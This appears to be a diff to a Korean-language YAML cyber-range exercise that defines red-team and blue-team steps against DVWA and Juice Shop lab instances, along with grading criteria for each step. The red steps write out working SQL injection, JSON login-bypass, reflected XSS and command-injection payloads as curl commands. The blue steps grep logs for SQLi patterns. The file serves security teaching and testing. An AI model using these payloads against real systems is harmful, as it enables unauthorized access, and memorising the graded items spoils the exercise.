@@ -34,20 +34,22 @@ steps:
     expect: /tmp/dvwa_cookies.txt
     field: filesystem
     semantic:
-      intent: '[RED] 웹 애플리케이션 공격 - 공격 기법 실행'
+      intent: '[RED] DVWA 로그인 — curl -c /tmp/dvwa_cookies.txt -d username=admin&password=password&Login=Login
+        으로 POST /login.php. -c 옵션으로 PHPSESSID·security 쿠키를 파일 저장해 후속 요청에 -b 로 재사용. 기본 계정 admin/password
+        악용'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - curl -c /tmp/dvwa_cookies.txt + POST /login.php
+      - username=admin&password=password 파라미터
+      - 쿠키 파일 생성으로 세션 유지
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl -c cookie.txt -d ... /login.php
+      - python requests.Session() 로 세션 유지
+      - Burp Repeater + 쿠키 추출
+      - selenium 자동 로그인
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 쿠키 저장 없이 POST 만 (세션 소멸)
+      - 기본 계정 (admin/password) 아닌 다른 자격 사용
+      - login.php 아닌 다른 엔드포인트
   target_vm: attacker
   script: "curl -c /tmp/dvwa_cookies.txt \\\n     -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php"
   risk_level: medium
@@ -67,20 +69,22 @@ steps:
     expect: First name
     field: stdout
     semantic:
-      intent: '[RED] 웹 애플리케이션 공격 - 공격 기법 실행'
+      intent: '[RED] DVWA SQLi 기본 공격 — /vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271 (URL 인코딩된 '' OR
+        ''1''=''1) 페이로드로 WHERE 절 항상 참 → 모든 사용자 정보 반환. -b /tmp/dvwa_cookies.txt 쿠키 재사용. First name/Surname
+        필드 다수 반환으로 성공 검증'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - /vulnerabilities/sqli/ 엔드포인트 GET 요청
+      - '%27+OR+%271%27%3D%271 또는 '' OR ''1''=''1 페이로드'
+      - First name 또는 Surname 응답 (여러 사용자)
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl -b cookie.txt /vulnerabilities/sqli/?id=<payload>
+      - ''' OR 1=1-- 주석 변형'
+      - ''' OR ''a''=''a 논리 같음'
+      - sqlmap -u <url> --cookie=... --data=id=1
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 정상 ID 입력 (SQLi 페이로드 없음)
+      - 쿠키 없이 미인증 요청 (보안 레벨 낮음 필요)
+      - First name 없음 — SQLi 실패
   target_vm: attacker
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
   risk_level: medium
@@ -100,20 +104,22 @@ steps:
     expect: users
     field: stdout
     semantic:
-      intent: '[RED] 웹 애플리케이션 공격 - 공격 기법 실행'
+      intent: '[RED] UNION SELECT + information_schema 기반 스키마 추출 — id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--
+        로 현재 DB 의 테이블 목록 조회. information_schema(MySQL 메타DB) 와 group_concat() 행 병합 기법. users 테이블 발견 → 후속
+        크리덴셜 추출 벡터'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - UNION SELECT FROM information_schema.tables 페이로드
+      - group_concat 또는 유사 행 병합 사용
+      - users 또는 테이블 이름 응답에 포함
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - UNION SELECT ... FROM information_schema.tables
+      - UNION ALL SELECT table_name FROM ...
+      - sqlmap -u <url> --tables
+      - Burp Intruder 로 컬럼 수 퍼징
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 기본 OR 1=1 만 (UNION 없음)
+      - information_schema 접근 없이 추측 테이블명
+      - 응답에 테이블명 없음
   target_vm: attacker
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"
   risk_level: medium
@@ -133,20 +139,22 @@ steps:
     expect: token
     field: stdout
     semantic:
-      intent: '[RED] 웹 애플리케이션 공격 - 공격 기법 실행'
+      intent: '[RED] JuiceShop /rest/user/login SQLi 인증 우회 — POST JSON body {email: '' or 1=1--, password:
+        x} 로 email 필드의 SQL 삽입 → WHERE 절 우회 → 첫 번째 사용자(관리자) 인증 성공 → JWT token 반환. DVWA(MySQL + PHP) 와 달리
+        Node.js + SQLite 환경의 SQLi'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - POST http://<web>:3000/rest/user/login JSON 요청
+      - email 필드에 ' or 1=1-- 또는 동등한 페이로드
+      - token 또는 authentication 응답 키 포함
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl -X POST + JSON body SQLi
+      - 'python requests.post(url, json={email: payload})'
+      - Burp Repeater 로 페이로드 변형
+      - 'sqlmap --data=... --headers=Content-Type: application/json'
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - DVWA 엔드포인트 재사용 (JuiceShop 아님)
+      - form-urlencoded 전송 (JSON 아님)
+      - token 없음 — 우회 실패
   target_vm: attacker
   script: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type:\
     \ application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"x\"}'"
@@ -167,20 +175,22 @@ steps:
     expect: <script>
     field: stdout
     semantic:
-      intent: '[RED] 웹 애플리케이션 공격 - 공격 기법 실행'
+      intent: '[RED] DVWA Reflected XSS — /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
+        로 URL 인코딩된 <script>alert(''XSS'')</script> 반사. 사용자 입력 name 파라미터가 HTML 응답에 그대로 삽입 → 브라우저에서 JS 실행.
+        응답에 <script> 태그 존재로 반사 검증 (Stored 아닌 Reflected)'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - /vulnerabilities/xss_r/?name= + <script> 페이로드
+      - 응답 HTML 에 <script> 태그 그대로 포함
+      - Reflected vs Stored XSS 구분 인지
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl /vulnerabilities/xss_r/?name=<script>alert(1)</script>
+      - <img src=x onerror=alert(1)> 대체 페이로드
+      - XSStrike / dalfox 자동 퍼징
+      - Burp Repeater + payload 리스트
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - Stored XSS 엔드포인트 사용 (xss_s)
+      - 페이로드 URL 인코딩 안 함
+      - 응답에 <script> 없음 — 필터링됨
   target_vm: attacker
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
   risk_level: medium
@@ -200,20 +210,22 @@ steps:
     expect: 10.20.30
     field: stdout
     semantic:
-      intent: '[BLUE] 웹 애플리케이션 공격 - 탐지·방어 구현'
+      intent: '[BLUE] Suricata eve.json SQL Injection 경보 조회 — tail /var/log/suricata/eve.json | jq select(.event_type==alert)
+        | timestamp + alert.signature + src_ip 출력 → grep -i sql 필터. ET Open SQL Injection 룰셋(UNION SELECT·OR
+        1=1·information_schema 패턴) 트리거 검증'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - jq 로 eve.json alert 필터 + .alert.signature 추출
+      - grep -i sql 로 SQLi 관련 경보만 선별
+      - timestamp + signature + src_ip 구조화 출력
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - jq + grep 파이프라인
+      - suricata-update 로 ET Open 룰 갱신
+      - Elastic Stack rule-based 질의
+      - Wazuh 에도 Suricata 통합 이벤트 검색
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - fast.log 재조회 (eve.json JSON 파싱 아님)
+      - SQL 필터 없이 전체 경보
+      - src_ip/timestamp 없이 signature 만
   target_vm: secu
   script: tail -100 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.timestamp)
     \(.alert.signature) from \(.src_ip)"' 2>/dev/null | grep -i sql | tail -5
@@ -235,20 +247,22 @@ steps:
     expect: union
     field: stdout
     semantic:
-      intent: '[BLUE] 웹 애플리케이션 공격 - 탐지·방어 구현'
+      intent: '[BLUE] Apache access.log SQLi 시도 패턴 grep — grep -iE (union|select|or%201%3D1|%27) 로 URL
+        인코딩된 SQL 키워드(union/select/OR 1=1/'' 싱글쿼터) 검색. 공격 시각·src_ip·URL 확인해 SQLi 시도 이력 분석. Apache 로그는 본문(POST
+        body) 없고 GET 파라미터만 캡처'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - grep -iE 로 (union|select|or 1=1|%27) 패턴 검색
+      - access.log 대상 + union 키워드 포함 출력
+      - URL 인코딩된 페이로드 인지 (%27 %3D 등)
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - grep -iE (union|select|or...|%27) access.log
+      - awk 로 400+ 상태 행만 필터 + grep
+      - goaccess 로 URL 빈도 + 수동 검토
+      - ELK/Splunk 질의 search sourcetype=access_combined
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - grep 없이 전체 덤프
+      - SQLi 키워드 패턴 부정확
+      - Apache 로그 한계(본문 없음) 인지 못 함
   target_vm: web
   script: grep -iE '(union|select|or%201%3D1|%27)' /var/log/apache2/access.log 2>/dev/null | tail -10
   risk_level: low
@@ -269,20 +283,23 @@ steps:
     expect: complete
     field: stdout
     semantic:
-      intent: '[BLUE] 웹 애플리케이션 공격 - 탐지·방어 구현'
+      intent: '[BLUE] ModSecurity modsec_audit.log 차단 로그 확인 — tail -50 /var/log/apache2/modsec_audit.log
+        | grep -E (SQL|XSS|Injection|id 9) 로 OWASP CRS 룰(9xxxxx 대역 SQLi/XSS 탐지 룰) 매칭된 차단 로그 추출. Apache
+        access.log 보다 상세한 공격 페이로드·매칭 룰·차단 결정 기록'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - modsec_audit.log 또는 modsec audit 관련 로그 조회
+      - SQL/XSS/Injection 패턴 필터
+      - complete 또는 차단 이벤트 출력
+      - ModSecurity CRS 룰 ID(9xxxxx) 구조 이해
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - tail + grep -E modsec_audit.log
+      - mlogc (ModSecurity Log Collector) 로 원격 전송
+      - Wazuh ruleset 로 ModSec 통합
+      - apache2ctl -t -D DUMP_MODULES 로 ModSec 활성 확인
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - Apache access.log 재조회 (modsec 로그 아님)
+      - CRS 룰 ID/카테고리 개념 없음
+      - 차단 vs 탐지(DetectionOnly) 모드 구분 없음
   target_vm: web
   script: sudo tail -50 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -E '(SQL|XSS|Injection|id
     "9)' | tail -10 || echo 'ModSecurity log check complete'
@@ -303,20 +320,22 @@ steps:
     expect: 127.0.0.1
     field: stdout
     semantic:
-      intent: '[RED] 웹 애플리케이션 공격 - 공격 기법 실행'
+      intent: '[RED] DVWA Command Injection — /vulnerabilities/exec/ 에 POST ip=127.0.0.1;cat+/etc/hostname&Submit=Submit
+        로 세미콜론(;) 명령 구분자 악용. 원래 ping 127.0.0.1 실행 후 cat /etc/hostname 이어서 실행. ping 결과의 127.0.0.1 문자열 확인으로
+        성공 검증'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - /vulnerabilities/exec/ POST 요청
+      - 세미콜론(;) 또는 && / | / $() 로 명령 연결
+      - 127.0.0.1 응답 (ping 결과) 포함
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl -b cookie + POST ip=127.0.0.1;<cmd>
+      - '| or && 명령 구분자'
+      - $(cmd) 서브쉘 삽입
+      - python requests.post 자동화
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 정상 IP 만 입력 (injection 없음)
+      - 쿠키 없이 미인증
+      - 응답에 명령 결과 없음
   target_vm: attacker
   script: "curl -b /tmp/dvwa_cookies.txt \\\n     -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/"
   risk_level: medium
@@ -338,20 +357,23 @@ steps:
     expect: complete
     field: stdout
     semantic:
-      intent: '[BLUE] 웹 애플리케이션 공격 - 탐지·방어 구현'
+      intent: '[BLUE] Wazuh SIEM /var/ossec/logs/alerts/alerts.json 웹 공격 종합 경보 — tail -30 + jq select(.rule.level
+        >= 5) | Level X: description 으로 level 5 이상 주의 이벤트 추출. Wazuh 는 Apache 로그를 디코더로 분석해 웹 공격 이벤트 생성.
+        Suricata(네트워크) + Wazuh(호스트) 교차 확인으로 가시성 확장'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - /var/ossec/logs/alerts/alerts.json 대상
+      - jq select(.rule.level >= N) 필터
+      - complete 또는 Wazuh 관련 출력
+      - rule.level 5 이상 = 주의 필요 이벤트 인지
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - jq select(.rule.level >= 5) alerts.json
+      - Wazuh Kibana dashboard 검색
+      - ossec-alert-digest 스크립트
+      - Wazuh API /alerts?q=rule.level>5
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - Suricata 로그 재조회 (Wazuh 아님)
+      - rule.level 필터 없이 전체
+      - SIEM 의 다중 소스 상관 개념 없음
   target_vm: siem
   script: 'sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq -r ''select(.rule.level
     >= 5) | "Level \(.rule.level): \(.rule.description)"'' 2>/dev/null | tail -10 || echo ''Wazuh alert
